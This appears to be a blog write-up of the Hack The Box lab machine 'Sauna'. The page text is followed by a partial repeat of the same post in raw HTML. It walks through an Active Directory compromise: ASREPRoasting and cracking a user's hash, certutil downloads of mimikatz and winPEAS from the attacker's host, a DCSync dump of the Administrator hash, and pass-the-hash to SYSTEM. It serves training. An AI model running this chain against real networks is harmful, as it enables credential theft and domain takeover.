the ldap service running on port 389. I used ldapsearch to enumerate the service. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ ldapsearch -x -h EGOTISTICAL-BANK.LOCAL -b &quot;dc=EGOTISTICAL-BANK,dc=LOCAL&quot; # extended LDIF # # LDAPv3 # base &lt;dc=EGOTISTICAL-BANK,dc=LOCAL&gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # ... # Hugo Smith, EGOTISTICAL-BANK.LOCAL dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL ... # numResponses: 19 # numEntries: 15 # numReferences: 3 Hugo Smith was the only record that stood out but… http://EGOTISTICAL-BANK.LOCAL/about.html: There was no such name in the team! However, there was a Fergus Smith and a Hugo Bear, so perhaps the name was a mix between them? I was feeling lost so I decided to look up the forums for hints and there were mentions about how domain usernames are generated from the first names and last names of the users. Based on article, I created a script to generate all possible usernames: 1 2 3 4 5 6 7 8 9 from itertools import product for i in product([&quot;Fergus&quot;, &quot;Hugo&quot;, &quot;Steven&quot;, &quot;Shaun&quot;, &quot;Bowie&quot;, &quot;Sophie&quot;], [&quot;Smith&quot;, &quot;Bear&quot;, &quot;Kerb&quot;, &quot;Coins&quot;, &quot;Taylor&quot;, &quot;Driver&quot;]): first = i[0].lower() last = i[1].lower() print(&quot;{}.{}&quot;.format(first, last)) print(&quot;{}-{}&quot;.format(first, last)) print(&quot;{}{}&quot;.format(first[0], last)) print(&quot;{}{}&quot;.format(first[:3], last[:3])) I ran the script and outputted the results in a file called users.txt. To brute force to the users that exist on the system, I will be using kerbrute. 1 2 3 4 5 6 $ python kerbrute.py -users ../users.txt -domain EGOTISTICAL-BANK.LOCAL -t 10 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Valid user =&gt; fsmith [NOT PREAUTH] [*] Valid user =&gt; hsmith [*] No passwords were discovered :&#39;( We found 2 users, one of which, being fsmith, do not have Kerberos Pre-authentication enabled! This means it can be a target for ASREPRoast attack, allowing us to get a AS-REP hash, which can be cracked to retrieve his password! More information about Kerberos-related attacks can be found in this article. 1 2 3 4 5 $ python GetNPUsers.py egotistical-bank.local/fsmith -no-pass -format hashcat -outputfile hashes.asreproast -no-pass Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Getting TGT for fsmith $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:f604c7fcbb03619c4dd07a7043ec58e1$3dd66d0d07181b382d49df41e89bcc3cb39647b1ebff6813da066d41c78be9b3252c782ab6a3de196275ac1fb6b0e7ff649249bfe1e3721fd419d20c5d4b9ce64aafdd50d05e8121fcdd85d55a037822cacb5aa4a83e985bad801831c4cb9cc155d2228125a2b81e439db3b04ff6dadd67d248892949900aa6a6ad96658c52e444e6421d2a148d0c768c17cce58d374802baca7ca16f89fcee72ff75269d0cb1e528ec117fb726efe69d7f513d89004d14264a1e3f266e163b3d3df9f8b73960c379f57f5e61eb08e18c7e9da5fddb217d94b8dce22f2a8f544267608f7f722b0e59d5b4fd87f30e84152e9d8e89159d356e76c4f2282e81561cdc426d11a04e Next, we proceed to crack it with hashcat. 1 2 3 4 $ hashcat -m 18200 --force -a 0 hash.asreproast /usr/share/wordlists/rockyou.txt ... $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:f604c7fcbb03619c4dd07a7043ec58e1$3dd66d0d07181b382d49df41e89bcc3cb39647b1ebff6813da066d41c78be9b3252c782ab6a3de196275ac1fb6b0e7ff649249bfe1e3721fd419d20c5d4b9ce64aafdd50d05e8121fcdd85d55a037822cacb5aa4a83e985bad801831c4cb9cc155d2228125a2b81e439db3b04ff6dadd67d248892949900aa6a6ad96658c52e444e6421d2a148d0c768c17cce58d374802baca7ca16f89fcee72ff75269d0cb1e528ec117fb726efe69d7f513d89004d14264a1e3f266e163b3d3df9f8b73960c379f57f5e61eb08e18c7e9da5fddb217d94b8dce22f2a8f544267608f7f722b0e59d5b4fd87f30e84152e9d8e89159d356e76c4f2282e81561cdc426d11a04e:Thestrokes23 ... With the password Thestrokes23, we can login into the box. But how ? Reconnaissance (2) I did a second round of scanning, but this time with all ports from 1 to 65535. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ nmap -sS -p 1-65535 EGOTISTICAL-BANK.LOCAL Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 09:44 EDT Nmap scan report for sauna.htb (10.10.10.175) Host is up (0.24s latency). Not shown: 65515 filtered ports PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49686/tcp open unknown 63004/tcp open unknown We can use the WinRM service on port 5985 to login into the box! I will be using evil-winrm to do so. user.txt 1 2 3 4 5 6 7 ruby evil-winrm.rb -i egotistical-bank.local -u fsmith -p Thestrokes23 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\FSmith\\Documents&gt; type ../Desktop/user.txt 1b55XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) With a shell now, we can enumerate the Active Directory environment using BloodHound. First we upload SharpHound.ps1 to the box. 1 2 3 *Evil-WinRM* PS C:\\Users\\FSmith\\Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/SharpHound.ps1 **** Online **** CertUtil: -URLCache command completed successfully. And then import it and run Invoke-BloodHound 1 2 *Evil-WinRM* PS C:\\Users\\FSmith\\Documents&gt; Import-Module .\\SharpHound.ps1 *Evil-WinRM* PS C:\\Users\\FSmith\\Documents&gt; Invoke-BloodHound -CollectionMethod All -Domain egotistical-bank.local -LDAPUser FSmith -LDAPPass Thestrokes23 Fortunately, evil-winrm supports a download feature so we can use it to retrieve the results. 1 2 3 4 5 *Evil-WinRM* PS C:\\Users\\FSmith\\Documents&gt; download 20200719092606_BloodHound.zip /root/Desktop/sauna/20200719092606_BloodHound.zip Info: Downloading C:\\Users\\FSmith\\Documents\\20200719092606_BloodHound.zip to /root/Desktop/sauna/20200719092606_BloodHound.zip Info: Download successful! Now we start the docker-bloodhound container and upload our results. 1 2 3 4 5 6 7 8 $ docker run -it \\ -p 7474:7474 \\ -e DISPLAY=unix$DISPLAY \\ -v /tmp/.X11-unix:/tmp/.X11-unix \\ --device=/dev/dri:/dev/dri \\ -v $(pwd)/data:/data \\ --name bloodhound belane/bloodhound $ mv 20200719092606_BloodHound.zip $(pwd)/data After uploading the data, I tried different queries and the query, Find Principals with DCSync Rights, shows a possible path. svc-loanmgr has DCSync rights, meaning we can use that account to retrieve the credentials of any domain user, including the Administrator! But the question is, how? Lets upload WinPEAS and run it to see if we can find anything to help us! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 *Evil-WinRM* PS C:\\Users\\FSmith\\Documents&gt; certutil -f -split -urlcache http://10.10.XX/winPEASx64.exe **** Online **** 000000 ... 037c00 CertUtil: -URLCache command completed successfully. *Evil-WinRM* PS C:\\Users\\FSmith\\Documents&gt; .\\winPEASx64.exe ... [+] Looking for AutoLogon credentials(T1012) Some AutoLogon credentials were found!! DefaultDomainName : 35mEGOTISTICALBANK DefaultUserName : 35mEGOTISTICALBANK\\svc_loanmanager DefaultPassword : Moneymakestheworldgoround! ... We found the password for svc_loanmanager, which is probably referring to svc_loanmgr. 1 2 3 4 5 6 7 $ ruby evil-winrm.rb -i egotistical-bank.local -u svc_loanmgr -p Moneymakestheworldgoround! Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents&gt; whoami egotisticalbank\\svc_loanmgr Exploitation As svc_loanmgr, we can now perform a DCSync attack with mimikatz.exe. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 *Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/mimikatz.exe **** Online **** CertUtil: -URLCache command completed successfully. *Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents&gt; .\\mimikatz &quot;lsadump::dcsync /domain:egotistical-bank.local /user:Administrator&quot; &quot;exit&quot; [DC] &#39;egotistical-bank.local&#39; will be the domain [DC] &#39;SAUNA.EGOTISTICAL-BANK.LOCAL&#39; will be the DC server [DC] &#39;Administrator&#39; will be the user account Object RDN : Administrator ** SAM ACCOUNT ** SAM Username : Administrator Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) Account expiration : Password last change : 1/24/2020 10:14:15 AM Object Security ID : S-1-5-21-2966785786-3096785034-1186376766-500 Object Relative ID : 500 Credentials: Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f lm - 0: ee8c50e6bc332970a8e8a632488f5211 root.txt With the NTLM hash of Administrator, we can psexec directly into the box! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 python psexec.py Administrator@egotistical-bank.local -hashes :d9485863c1e9e05851aa40cbb4ab9dff Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on 10.10.10.175..... [*] Found writable share ADMIN$ [*] Uploading file VMlklPxX.exe [*] Opening SVCManager on 10.10.10.175..... [*] Creating service xbmD on 10.10.10.175..... [*] Starting service xbmD..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.973] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami nt authority\\system C:\\Windows\\system32&gt;more C:\\Users\\Administrator\\Desktop\\root.txt f3eeXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/sauna-htb/","@type":"BlogPosting","headline":"Hack The Box - Sauna","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-07-19T19:50:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Sauna | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Sauna</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Sauna</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Jul 19, 2020, 7:50 PM +0800" > Jul 19, 2020 <i class="unloaded">2020-07-19T19:50:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1576 words">8 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sauna.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating systems that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.175 sauna.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance-1">Reconnaissance (1)</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span>  sauna.htb
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-03-14 09:31 EDT
Nmap scan report <span class="k">for </span>sauna.htb <span class="o">(</span>10.10.10.175<span class="o">)</span>
Host is up <span class="o">(</span>0.28s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    <span class="nb">bind
</span>80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-03-14 20:34:26Z<span class="o">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>3/14%Time<span class="o">=</span>5E6CDCEA%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
SF:ersionBindReqTCP,20,<span class="s2">"</span><span class="se">\0\x</span><span class="s2">1e</span><span class="se">\0\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">04</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\0\0\0\0\0\x</span><span class="s2">07version</span><span class="se">\</span><span class="s2">
SF:x04bind</span><span class="se">\0\0\x</span><span class="s2">10</span><span class="se">\0\x</span><span class="s2">03"</span><span class="o">)</span><span class="p">;</span>
Service Info: Host: SAUNA<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h02m02s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2020-03-14T20:36:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>340.69 seconds

</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><p>From the <code class="language-plaintext highlighter-rouge">nmap</code> results, we can guess that this box is a Domain Controller from the amount of AD-related services that it is running. We are also able to pick up that the domain that this box belongs to is <code class="language-plaintext highlighter-rouge">EGOTISTICAL-BANK.LOCAL</code>, so lets add that to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
...
10.10.10.175 sauna.htb EGOTISTICAL-BANK.LOCAL
</pre></table></code></div></div><p>There’s an <code class="language-plaintext highlighter-rouge">IIS</code> web server running on port <code class="language-plaintext highlighter-rouge">80</code> so lets check that out.</p><p><code class="language-plaintext highlighter-rouge">http://EGOTISTICAL-BANK.LOCAL</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sauna1.png" alt="" /></p><p>After navigating all the pages, it was mostly static <code class="language-plaintext highlighter-rouge">.html</code> content. I decided to move on to the <code class="language-plaintext highlighter-rouge">ldap</code> service running on port <code class="language-plaintext highlighter-rouge">389</code>. I used <code class="language-plaintext highlighter-rouge">ldapsearch</code> to enumerate the service.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> EGOTISTICAL-BANK.LOCAL <span class="nt">-b</span> <span class="s2">"dc=EGOTISTICAL-BANK,dc=LOCAL"</span>
<span class="c"># extended LDIF</span>
<span class="c">#</span>
<span class="c"># LDAPv3</span>
<span class="c"># base &lt;dc=EGOTISTICAL-BANK,dc=LOCAL&gt; with scope subtree</span>
<span class="c"># filter: (objectclass=*)</span>
<span class="c"># requesting: ALL</span>
<span class="c">#</span>

...

<span class="c"># Hugo Smith, EGOTISTICAL-BANK.LOCAL</span>
dn: <span class="nv">CN</span><span class="o">=</span>Hugo Smith,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL

...

<span class="c"># numResponses: 19</span>
<span class="c"># numEntries: 15</span>
<span class="c"># numReferences: 3</span>

</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Hugo Smith</code> was the only record that stood out but…</p><p><code class="language-plaintext highlighter-rouge">http://EGOTISTICAL-BANK.LOCAL/about.html</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sauna2.png" alt="" /></p><p>There was no such name in the team! However, there was a <code class="language-plaintext highlighter-rouge">Fergus Smith</code> and a <code class="language-plaintext highlighter-rouge">Hugo Bear</code>, so perhaps the name was a mix between them? I was feeling lost so I decided to look up the forums for hints and there were mentions about how domain usernames are generated from the first names and last names of the users. Based on <a href="https://activedirectorypro.com/active-directory-user-naming-convention/">article</a>, I created a script to generate all possible usernames:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">product</span><span class="p">([</span><span class="s">"Fergus"</span><span class="p">,</span> <span class="s">"Hugo"</span><span class="p">,</span> <span class="s">"Steven"</span><span class="p">,</span> <span class="s">"Shaun"</span><span class="p">,</span> <span class="s">"Bowie"</span><span class="p">,</span> <span class="s">"Sophie"</span><span class="p">],</span> <span class="p">[</span><span class="s">"Smith"</span><span class="p">,</span> <span class="s">"Bear"</span><span class="p">,</span> <span class="s">"Kerb"</span><span class="p">,</span> <span class="s">"Coins"</span><span class="p">,</span> <span class="s">"Taylor"</span><span class="p">,</span> <span class="s">"Driver"</span><span class="p">]):</span>
    <span class="n">first</span> <span class="o">=</span> <span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">lower</span><span class="p">()</span>
    <span class="n">last</span> <span class="o">=</span> <span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">lower</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"{}.{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">first</span><span class="p">,</span> <span class="n">last</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"{}-{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">first</span><span class="p">,</span> <span class="n">last</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"{}{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">first</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">last</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"{}{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">first</span><span class="p">[:</span><span class="mi">3</span><span class="p">],</span> <span class="n">last</span><span class="p">[:</span><span class="mi">3</span><span class="p">]))</span>
